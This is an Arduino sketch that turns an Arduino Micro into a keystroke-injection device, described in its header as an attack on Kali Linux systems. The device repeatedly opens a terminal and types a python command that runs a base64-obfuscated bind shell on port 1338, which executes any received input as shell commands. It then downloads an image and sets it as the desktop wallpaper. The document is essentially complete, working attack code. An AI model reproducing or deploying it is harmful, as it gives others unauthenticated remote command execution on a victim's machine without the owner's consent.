/**
 * File: Arduino sketchup for Arduino Micro.
 * Arduino opens up gnome-terminal, runs python shell, and changes background
 * Python shell opens up on 1338 unless edited.
 * Background is set to http://i.imgur.com/3Novb98.jpg
 * This attack is designed or Kali Linux systems.
 */

void f2Run(char command[]) {
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  delay(200);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.begin();
  Keyboard.print(command);
  Keyboard.end();
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(100);
}

void runCommand(char command[]) {
  Keyboard.begin();
  Keyboard.print(command);
  Keyboard.end();
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(100);
}

void gnomeTerminal() {
  f2Run("gnome-terminal");
  delay(1500);
}

void shell() {
  // python shell
  runCommand("python -c \"import base64;p=1338;eval(compile(base64.b64decode('aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwpoID0gJycKI3AgPSAxMzM4CnMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCnMuc2V0c29ja29wdChzb2NrZXQuU09MX1NPQ0tFVCwgc29ja2V0LlNPX1JFVVNFQUREUiwgMSkKcy5iaW5kKChoLCBwKSkKcy5saXN0ZW4oMTApCndoaWxlIDE6CiAgYywgYWRkcmVzcyA9IHMuYWNjZXB0KCkKICB3aGlsZSAxOgogICAgZCA9IGMucmVjdigxMDI0KQogICAgaWYgKGQgPT0gIiIpOgogICAgICBicmVhawogICAgYy5zZW5kKHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KGQsIHNoZWxsPVRydWUpKQogIGMuY2xvc2UoKQpzLmNsb3NlKCkK'), '<string>', 'exec'));\" &");
}

void wallpaper() {
  // Image payloads are too big, sticking with wget.
  runCommand("wget http://i.imgur.com/3Novb98.jpg;gsettings set org.gnome.desktop.background picture-uri file://`pwd`/3Novb98.jpg;gsettings set org.gnome.desktop.background picture-options \"centered\"");
}

void setup() {
  Serial.begin(9600);
}

void loop() {
  delay(3000);
  gnomeTerminal();
  shell();
  wallpaper();
  runCommand("exit");
  delay(60000);
}
